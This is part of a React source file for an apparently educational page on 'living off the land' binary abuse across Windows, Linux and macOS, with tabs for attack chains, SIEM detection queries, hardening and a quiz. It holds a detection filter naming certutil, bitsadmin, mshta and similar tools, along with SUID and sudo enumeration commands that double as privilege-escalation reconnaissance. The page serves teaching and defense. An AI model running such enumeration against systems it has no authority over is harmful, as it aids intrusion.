              <Paper sx={{ mb: 3, p: 2.5, bgcolor: "#0c0f1c", borderRadius: 2 }}>
                <Typography variant="h6" sx={{ color: "#f97316", mb: 1 }}>
                  Learning Objectives
                </Typography>
                <List dense>
                  {learningObjectives.map((item) => (
                    <ListItem key={item}>
                      <ListItemIcon>
                        <CheckCircleIcon color="info" fontSize="small" />
                      </ListItemIcon>
                      <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: "grey.300" } }} />
                    </ListItem>
                  ))}
                </List>
              </Paper>

              <Paper
                sx={{
                  p: 2.5,
                  mb: 3,
                  bgcolor: "#0e1222",
                  border: "1px solid rgba(239,68,68,0.3)",
                  borderRadius: 2,
                }}
              >
                <Typography variant="h6" sx={{ color: "#f87171", mb: 1 }}>
                  Engagement Guardrails
                </Typography>
                <List dense>
                  {guardrails.map((item) => (
                    <ListItem key={item}>
                      <ListItemIcon>
                        <CheckCircleIcon color="success" fontSize="small" />
                      </ListItemIcon>
                      <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: "grey.300" } }} />
                    </ListItem>
                  ))}
                </List>
              </Paper>

              <Paper sx={{ mb: 3, p: 2.5, bgcolor: "#0c0f1c", borderRadius: 2 }}>
                <Typography variant="h6" sx={{ color: "#f97316", mb: 1 }}>
                  Beginner Path
                </Typography>
                <List dense>
                  {beginnerPath.map((step) => (
                    <ListItem key={step}>
                      <ListItemIcon>
                        <CheckCircleIcon color="info" fontSize="small" />
                      </ListItemIcon>
                      <ListItemText primary={step} sx={{ "& .MuiListItemText-primary": { color: "grey.300" } }} />
                    </ListItem>
                  ))}
                </List>
              </Paper>

              <Paper sx={{ mb: 3, p: 2.5, bgcolor: "#0c0f1c", borderRadius: 2 }}>
                <Typography variant="h6" sx={{ color: "#a5b4fc", mb: 2 }}>
                  Quick Glossary
                </Typography>
                <TableContainer>
                  <Table size="small">
                    <TableHead>
                      <TableRow>
                        <TableCell sx={{ color: "#a5b4fc" }}>Term</TableCell>
                        <TableCell sx={{ color: "#a5b4fc" }}>Meaning</TableCell>
                      </TableRow>
                    </TableHead>
                    <TableBody>
                      {glossary.map((item) => (
                        <TableRow key={item.term}>
                          <TableCell sx={{ color: "grey.200", fontWeight: 600 }}>{item.term}</TableCell>
                          <TableCell sx={{ color: "grey.400" }}>{item.desc}</TableCell>
                        </TableRow>
                      ))}
                    </TableBody>
                  </Table>
                </TableContainer>
              </Paper>

              <Paper sx={{ mb: 3, p: 2.5, bgcolor: "#0c0f1c", borderRadius: 2 }}>
                <Typography variant="h6" sx={{ color: "#f97316", mb: 2 }}>
                  Common Misconceptions
                </Typography>
                <Grid container spacing={2}>
                  {commonMisconceptions.map((item) => (
                    <Grid item xs={12} md={4} key={item.myth}>
                      <Paper
                        sx={{
                          p: 2,
                          bgcolor: "#0b1020",
                          borderRadius: 2,
                          border: "1px solid rgba(249,115,22,0.3)",
                          height: "100%",
                        }}
                      >
                        <Typography variant="subtitle2" sx={{ color: "#f97316", mb: 1 }}>
                          Myth
                        </Typography>
                        <Typography variant="body2" sx={{ color: "grey.300", mb: 1 }}>
                          {item.myth}
                        </Typography>
                        <Typography variant="subtitle2" sx={{ color: "#a5b4fc", mb: 0.5 }}>
                          Reality
                        </Typography>
                        <Typography variant="body2" sx={{ color: "grey.400" }}>
                          {item.reality}
                        </Typography>
                      </Paper>
                    </Grid>
                  ))}
                </Grid>
              </Paper>

              <Paper sx={{ p: 2.5, bgcolor: "#0c0f1c", borderRadius: 2 }}>
                <Typography variant="subtitle1" sx={{ color: "#a5b4fc", mb: 1 }}>
                  Common Objectives
                </Typography>
                <List dense>
                  {[
                    "Discovery: gather environment, user, and network context.",
                    "Execution: run trusted binaries to launch other actions.",
                    "Persistence: configure scheduled tasks or login items.",
                    "Lateral movement: use remote administration tools and protocols.",
                    "Defense evasion: blend with standard admin activity.",
                  ].map((step) => (
                    <ListItem key={step}>
                      <ListItemIcon>
                        <CheckCircleIcon color="info" fontSize="small" />
                      </ListItemIcon>
                      <ListItemText primary={step} sx={{ "& .MuiListItemText-primary": { color: "grey.300" } }} />
                    </ListItem>
                  ))}
                </List>
              </Paper>

              <Paper sx={{ mt: 3, p: 2.5, bgcolor: "#0c0f1c", borderRadius: 2 }}>
                <Typography variant="subtitle1" sx={{ color: "#a5b4fc", mb: 1 }}>
                  Beginner Signals to Watch For
                </Typography>
                <List dense>
                  {beginnerSignals.map((step) => (
                    <ListItem key={step}>
                      <ListItemIcon>
                        <CheckCircleIcon color="warning" fontSize="small" />
                      </ListItemIcon>
                      <ListItemText primary={step} sx={{ "& .MuiListItemText-primary": { color: "grey.300" } }} />
                    </ListItem>
                  ))}
                </List>
              </Paper>
            </Box>
          </TabPanel>

          <TabPanel value={tabValue} index={1}>
            <Box sx={{ p: 3 }}>
              <Alert severity="info" sx={{ mb: 3, bgcolor: "rgba(59, 130, 246, 0.1)" }}>
                <strong>LOLBAS Project:</strong> Living Off The Land Binaries And Scripts - a community-maintained list of Windows binaries that can be abused.
              </Alert>

              {windowsLOLBins.slice(0, 5).map((bin) => (
                <Accordion key={bin.name} sx={{ mb: 1, bgcolor: "#0c0f1c", "&:before": { display: "none" } }}>
                  <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: "grey.400" }} />}>
                    <Box sx={{ display: "flex", alignItems: "center", gap: 2, width: "100%" }}>
                      <Typography variant="h6" sx={{ color: "#f97316", fontWeight: 700 }}>{bin.name}</Typography>
                      <Box sx={{ display: "flex", gap: 0.5 }}>
                        {bin.mitre.map((t) => (
                          <Chip key={t} label={t} size="small" sx={{ bgcolor: "rgba(239, 68, 68, 0.2)", color: "#f87171", fontSize: "0.7rem" }} />
                        ))}
                      </Box>
                    </Box>
                  </AccordionSummary>
                  <AccordionDetails>
                    <Grid container spacing={2}>
                      <Grid item xs={12}>
                        <Typography variant="body2" sx={{ color: "grey.400", mb: 1 }}>
                          <strong>Path:</strong> {bin.path}
                        </Typography>
                        <Typography variant="body2" sx={{ color: "grey.400", mb: 2 }}>
                          <strong>Legitimate Use:</strong> {bin.legitimateUse}
                        </Typography>
                      </Grid>
                      <Grid item xs={12}>
                        <Typography variant="subtitle2" sx={{ color: "#a5b4fc", mb: 1 }}>Abuse Methods</Typography>
                        <TableContainer>
                          <Table size="small">
                            <TableHead>
                              <TableRow>
                                <TableCell sx={{ color: "#f97316" }}>Method</TableCell>
                                <TableCell sx={{ color: "#f97316" }}>Command</TableCell>
                                <TableCell sx={{ color: "#f97316" }}>Risk</TableCell>
                              </TableRow>
                            </TableHead>
                            <TableBody>
                              {bin.abuseMethods.map((method, idx) => (
                                <TableRow key={idx}>
                                  <TableCell sx={{ color: "grey.300" }}>{method.method}</TableCell>
                                  <TableCell>
                                    <Box component="code" sx={{ color: "#93c5fd", fontSize: "0.75rem", wordBreak: "break-all" }}>
                                      {method.command.length > 60 ? method.command.substring(0, 60) + "..." : method.command}
                                    </Box>
                                  </TableCell>
                                  <TableCell>
                                    <Chip 
                                      label={method.risk} 
                                      size="small" 
                                      sx={{ 
                                        bgcolor: method.risk === "Critical" ? "rgba(239, 68, 68, 0.2)" : 
                                                 method.risk === "High" ? "rgba(249, 115, 22, 0.2)" : "rgba(59, 130, 246, 0.2)",
                                        color: method.risk === "Critical" ? "#f87171" : 
                                               method.risk === "High" ? "#fb923c" : "#60a5fa"
                                      }} 
                                    />
                                  </TableCell>
                                </TableRow>
                              ))}
                            </TableBody>
                          </Table>
                        </TableContainer>
                      </Grid>
                      <Grid item xs={12}>
                        <Typography variant="subtitle2" sx={{ color: "#10b981", mb: 1 }}>Detection</Typography>
                        <Typography variant="body2" sx={{ color: "grey.400" }}>{bin.detection}</Typography>
                      </Grid>
                    </Grid>
                  </AccordionDetails>
                </Accordion>
              ))}

              <Accordion sx={{ mt: 3, bgcolor: "#0c0f1c" }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: "grey.400" }} />}>
                  <Typography variant="h6">Safe Inventory Commands</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    code={`# List common LOLBins on Windows
where certutil bitsadmin powershell rundll32 regsvr32 mshta schtasks wmic msiexec

# PowerShell inventory with signature check
Get-Command certutil, bitsadmin, mshta, rundll32, regsvr32, wmic, msiexec | 
  ForEach-Object { Get-AuthenticodeSignature $_.Source } | 
  Format-Table Path, Status, SignerCertificate

# Check for recently executed LOLBins (requires admin)
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';ID=1} -MaxEvents 100 | 
  Where-Object { $_.Message -match 'certutil|bitsadmin|mshta|rundll32|regsvr32' } |
  Select-Object TimeCreated, Message`}
                    language="powershell"
                  />
                </AccordionDetails>
              </Accordion>
            </Box>
          </TabPanel>

          <TabPanel value={tabValue} index={2}>
            <Box sx={{ p: 3 }}>
              <Alert severity="info" sx={{ mb: 3, bgcolor: "rgba(59, 130, 246, 0.1)" }}>
                <strong>GTFOBins:</strong> A curated list of Unix binaries that can be exploited when misconfigured with SUID, sudo, or capabilities.
              </Alert>

              {linuxGTFOBins.slice(0, 5).map((bin) => (
                <Accordion key={bin.name} sx={{ mb: 1, bgcolor: "#0c0f1c", "&:before": { display: "none" } }}>
                  <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: "grey.400" }} />}>
                    <Box sx={{ display: "flex", alignItems: "center", gap: 2, width: "100%" }}>
                      <Typography variant="h6" sx={{ color: "#f97316", fontWeight: 700 }}>{bin.name}</Typography>
                      <Box sx={{ display: "flex", gap: 0.5 }}>
                        {bin.capabilities.map((c) => (
                          <Chip key={c} label={c} size="small" sx={{ bgcolor: "rgba(139, 92, 246, 0.2)", color: "#a78bfa", fontSize: "0.7rem" }} />
                        ))}
                      </Box>
                    </Box>
                  </AccordionSummary>
                  <AccordionDetails>
                    <Grid container spacing={2}>
                      <Grid item xs={12}>
                        <Typography variant="body2" sx={{ color: "grey.400", mb: 1 }}>
                          <strong>Path:</strong> {bin.path}
                        </Typography>
                        <Typography variant="body2" sx={{ color: "grey.400", mb: 2 }}>
                          <strong>Legitimate Use:</strong> {bin.legitimateUse}
                        </Typography>
                      </Grid>
                      <Grid item xs={12}>
                        <Typography variant="subtitle2" sx={{ color: "#a5b4fc", mb: 1 }}>Abuse Methods</Typography>
                        <TableContainer>
                          <Table size="small">
                            <TableHead>
                              <TableRow>
                                <TableCell sx={{ color: "#f97316" }}>Method</TableCell>
                                <TableCell sx={{ color: "#f97316" }}>Condition</TableCell>
                                <TableCell sx={{ color: "#f97316" }}>Risk</TableCell>
                              </TableRow>
                            </TableHead>
                            <TableBody>
                              {bin.abuseMethods.map((method, idx) => (
                                <TableRow key={idx}>
                                  <TableCell sx={{ color: "grey.300" }}>{method.method}</TableCell>
                                  <TableCell sx={{ color: "grey.400", fontSize: "0.8rem" }}>{method.condition}</TableCell>
                                  <TableCell>
                                    <Chip 
                                      label={method.risk} 
                                      size="small" 
                                      sx={{ 
                                        bgcolor: method.risk === "Critical" ? "rgba(239, 68, 68, 0.2)" : 
                                                 method.risk === "High" ? "rgba(249, 115, 22, 0.2)" : "rgba(59, 130, 246, 0.2)",
                                        color: method.risk === "Critical" ? "#f87171" : 
                                               method.risk === "High" ? "#fb923c" : "#60a5fa"
                                      }} 
                                    />
                                  </TableCell>
                                </TableRow>
                              ))}
                            </TableBody>
                          </Table>
                        </TableContainer>
                      </Grid>
                      <Grid item xs={12}>
                        <Typography variant="subtitle2" sx={{ color: "#10b981", mb: 1 }}>Detection</Typography>
                        <Typography variant="body2" sx={{ color: "grey.400" }}>{bin.detection}</Typography>
                      </Grid>
                    </Grid>
                  </AccordionDetails>
                </Accordion>
              ))}

              <Accordion sx={{ mt: 3, bgcolor: "#0c0f1c" }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: "grey.400" }} />}>
                  <Typography variant="h6">SUID/Sudo Audit Commands</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    code={`# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find all SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Check current user's sudo permissions
sudo -l

# Find binaries with capabilities
getcap -r / 2>/dev/null

# Check for writable PATH directories
echo $PATH | tr ':' '\\n' | xargs -I{} ls -ld {} 2>/dev/null | grep -E "^d.......w"

# Cross-reference with GTFOBins (manual check)
# https://gtfobins.github.io/`}
                    language="bash"
                  />
                </AccordionDetails>
              </Accordion>
            </Box>
          </TabPanel>

          <TabPanel value={tabValue} index={3}>
            <Box sx={{ p: 3 }}>
              <Accordion defaultExpanded>
                <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                  <Typography variant="h6">macOS Built-in Tools</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography variant="body2" sx={{ color: "grey.400", mb: 2 }}>
                    macOS has powerful utilities that can be abused if not monitored. Focus on detection and safe inventory.
                  </Typography>
                  <TableContainer>
                    <Table size="small">
                      <TableHead>
                        <TableRow>
                          <TableCell sx={{ color: "#f97316" }}>Binary</TableCell>
                          <TableCell sx={{ color: "#f97316" }}>Category</TableCell>
                          <TableCell sx={{ color: "#f97316" }}>Detection Signal</TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {macTable.map((item) => (
                          <TableRow key={item.bin}>
                            <TableCell sx={{ color: "grey.200", fontWeight: 600 }}>{item.bin}</TableCell>
                            <TableCell sx={{ color: "grey.400" }}>{item.category}</TableCell>
                            <TableCell sx={{ color: "grey.400" }}>{item.signal}</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </TableContainer>
                </AccordionDetails>
              </Accordion>

              <Accordion>
                <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                  <Typography variant="h6">Safe Inventory Commands</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    code={`# macOS command inventory
which osascript launchctl plutil defaults security curl

# List user LaunchAgents (read-only)
ls -la ~/Library/LaunchAgents`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion>
                <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                  <Typography variant="h6">Beginner Focus Areas</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <List dense>
                    {[
                      "New LaunchAgents or LaunchDaemons created in user directories.",
                      "Scripts executed by office apps or browsers through automation tools.",
                      "Repeated use of curl from user profiles.",
                      "Keychain access from unexpected parent processes.",
                    ].map((item) => (
                      <ListItem key={item}>
                        <ListItemIcon>
                          <CheckCircleIcon color="warning" fontSize="small" />
                        </ListItemIcon>
                        <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: "grey.300" } }} />
                      </ListItem>
                    ))}
                  </List>
                </AccordionDetails>
              </Accordion>
            </Box>
          </TabPanel>

          <TabPanel value={tabValue} index={4}>
            <Box sx={{ p: 3 }}>
              <Alert severity="warning" sx={{ mb: 3, bgcolor: "rgba(249, 115, 22, 0.1)" }}>
                <strong>Real-World Attack Chains:</strong> Understanding how LOLBins are chained together helps build better detections.
              </Alert>

              {attackChains.map((chain, idx) => (
                <Paper key={idx} sx={{ p: 3, mb: 3, bgcolor: "#0c0f1c", borderRadius: 2 }}>
                  <Typography variant="h6" sx={{ color: "#f97316", mb: 1 }}>{chain.name}</Typography>
                  <Typography variant="body2" sx={{ color: "grey.400", mb: 2 }}>{chain.description}</Typography>
                  
                  <Box sx={{ display: "flex", flexWrap: "wrap", gap: 1, mb: 2 }}>
                    {chain.steps.map((step, i) => (
                      <React.Fragment key={i}>
                        <Paper sx={{ p: 1.5, bgcolor: "#0b1020", borderRadius: 1, border: "1px solid rgba(249,115,22,0.3)" }}>
                          <Typography variant="caption" sx={{ color: "#f97316" }}>Step {step.step}</Typography>
                          <Typography variant="body2" sx={{ color: "grey.300", fontSize: "0.8rem" }}>{step.action}</Typography>
                          <Box sx={{ display: "flex", gap: 0.5, mt: 0.5 }}>
                            <Chip label={step.binary} size="small" sx={{ fontSize: "0.65rem", bgcolor: "rgba(139, 92, 246, 0.2)", color: "#a78bfa" }} />
                            <Chip label={step.technique} size="small" sx={{ fontSize: "0.65rem", bgcolor: "rgba(239, 68, 68, 0.2)", color: "#f87171" }} />
                          </Box>
                        </Paper>
                        {i < chain.steps.length - 1 && <Typography sx={{ color: "grey.600", alignSelf: "center" }}>→</Typography>}
                      </React.Fragment>
                    ))}
                  </Box>

                  <Typography variant="subtitle2" sx={{ color: "#10b981", mb: 1 }}>Detection Opportunities</Typography>
                  <Box sx={{ display: "flex", flexWrap: "wrap", gap: 1 }}>
                    {chain.detectionOpportunities.map((opp, i) => (
                      <Chip key={i} label={opp} size="small" sx={{ bgcolor: "rgba(16, 185, 129, 0.2)", color: "#34d399" }} />
                    ))}
                  </Box>
                </Paper>
              ))}
            </Box>
          </TabPanel>

          <TabPanel value={tabValue} index={5}>
            <Box sx={{ p: 3 }}>
              <Alert severity="info" sx={{ mb: 3, bgcolor: "rgba(59, 130, 246, 0.1)" }}>
                Copy-paste ready SIEM queries for detecting LOLBin abuse. Adjust field names for your environment.
              </Alert>

              <Typography variant="h6" sx={{ color: "#f97316", mb: 2 }}>Splunk Queries</Typography>
              {siemQueries.splunk.slice(0, 3).map((query, idx) => (
                <Accordion key={idx} sx={{ mb: 1, bgcolor: "#0c0f1c", "&:before": { display: "none" } }}>
                  <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: "grey.400" }} />}>
                    <Typography sx={{ color: "grey.200" }}>{query.name}</Typography>
                  </AccordionSummary>
                  <AccordionDetails>
                    <Typography variant="body2" sx={{ color: "grey.400", mb: 2 }}>{query.description}</Typography>
                    <CodeBlock code={query.query} language="spl" />
                  </AccordionDetails>
                </Accordion>
              ))}

              <Typography variant="h6" sx={{ color: "#3b82f6", mb: 2, mt: 3 }}>Microsoft Sentinel (KQL)</Typography>
              {siemQueries.sentinel.slice(0, 3).map((query, idx) => (
                <Accordion key={idx} sx={{ mb: 1, bgcolor: "#0c0f1c", "&:before": { display: "none" } }}>
                  <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: "grey.400" }} />}>
                    <Typography sx={{ color: "grey.200" }}>{query.name}</Typography>
                  </AccordionSummary>
                  <AccordionDetails>
                    <Typography variant="body2" sx={{ color: "grey.400", mb: 2 }}>{query.description}</Typography>
                    <CodeBlock code={query.query} language="kql" />
                  </AccordionDetails>
                </Accordion>
              ))}
            </Box>
          </TabPanel>

          <TabPanel value={tabValue} index={6}>
            <Box sx={{ p: 3 }}>
              {hardeningRecommendations.map((category, idx) => (
                <Paper key={idx} sx={{ p: 2.5, mb: 3, bgcolor: "#0c0f1c", borderRadius: 2 }}>
                  <Typography variant="h6" sx={{ color: "#f97316", mb: 2 }}>{category.category}</Typography>
                  <TableContainer>
                    <Table size="small">
                      <TableHead>
                        <TableRow>
                          <TableCell sx={{ color: "#a5b4fc" }}>Control</TableCell>
                          <TableCell sx={{ color: "#a5b4fc" }}>Description</TableCell>
                          <TableCell sx={{ color: "#a5b4fc" }}>Priority</TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {category.items.map((item, i) => (
                          <TableRow key={i}>
                            <TableCell sx={{ color: "grey.200", fontWeight: 600 }}>{item.control}</TableCell>
                            <TableCell sx={{ color: "grey.400" }}>{item.description}</TableCell>
                            <TableCell>
                              <Chip 
                                label={item.priority} 
                                size="small" 
                                sx={{ 
                                  bgcolor: item.priority === "Critical" ? "rgba(239, 68, 68, 0.2)" : 
                                           item.priority === "High" ? "rgba(249, 115, 22, 0.2)" : "rgba(59, 130, 246, 0.2)",
                                  color: item.priority === "Critical" ? "#f87171" : 
                                         item.priority === "High" ? "#fb923c" : "#60a5fa"
                                }} 
                              />
                            </TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </TableContainer>
                </Paper>
              ))}
            </Box>
          </TabPanel>

          <TabPanel value={tabValue} index={7}>
            <Box sx={{ p: 3 }}>
              <Grid container spacing={3}>
                {labExercises.map((lab, idx) => (
                  <Grid item xs={12} md={6} key={idx}>
                    <Card sx={{ bgcolor: "#0c0f1c", height: "100%", border: "1px solid rgba(249,115,22,0.2)" }}>
                      <CardContent>
                        <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 2 }}>
                          <Typography variant="h6" sx={{ color: "#f97316" }}>{lab.name}</Typography>
                          <Box sx={{ display: "flex", gap: 1 }}>
                            <Chip 
                              label={lab.difficulty} 
                              size="small" 
                              sx={{ 
                                bgcolor: lab.difficulty === "Beginner" ? "rgba(16, 185, 129, 0.2)" : 
                                         lab.difficulty === "Intermediate" ? "rgba(249, 115, 22, 0.2)" : "rgba(239, 68, 68, 0.2)",
                                color: lab.difficulty === "Beginner" ? "#34d399" : 
                                       lab.difficulty === "Intermediate" ? "#fb923c" : "#f87171"
                              }} 
                            />
                            <Chip label={lab.duration} size="small" sx={{ bgcolor: "rgba(59, 130, 246, 0.2)", color: "#60a5fa" }} />
                          </Box>
                        </Box>
                        <Typography variant="subtitle2" sx={{ color: "#a5b4fc", mb: 1 }}>Objectives</Typography>
                        <List dense>
                          {lab.objectives.map((obj, i) => (
                            <ListItem key={i} sx={{ py: 0 }}>
                              <ListItemIcon sx={{ minWidth: 28 }}>
                                <CheckCircleIcon sx={{ fontSize: 14, color: "#10b981" }} />
                              </ListItemIcon>
                              <ListItemText primary={obj} primaryTypographyProps={{ variant: "body2", sx: { color: "grey.400" } }} />
                            </ListItem>
                          ))}
                        </List>
                      </CardContent>
                    </Card>
                  </Grid>
                ))}
              </Grid>
            </Box>
          </TabPanel>
        </Paper>

        <Paper
          id="quiz-section"
          sx={{
            mt: 4,
            p: 4,
            borderRadius: 3,
            border: `1px solid ${alpha(QUIZ_ACCENT_COLOR, 0.2)}`,
          }}
        >
          <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
            <QuizIcon sx={{ color: QUIZ_ACCENT_COLOR }} />
            Knowledge Check
          </Typography>
          <QuizSection
            questions={quizQuestions}
            accentColor={QUIZ_ACCENT_COLOR}
            title="Living Off The Land Knowledge Check"
            description="Random 10-question quiz drawn from a 75-question bank each time you start the quiz."
            questionsPerQuiz={QUIZ_QUESTION_COUNT}
          />
        </Paper>

        <Box sx={{ mt: 4, textAlign: "center" }}>
          <Button
            variant="outlined"
            startIcon={<ArrowBackIcon />}
            onClick={() => navigate("/learn")}
            sx={{ borderColor: "#f97316", color: "#f97316" }}
          >
            Back to Learning Hub
          </Button>
        </Box>
      </Container>
    </Box>
    </LearnPageLayout>
  );
};

export default LivingOffTheLandPage;
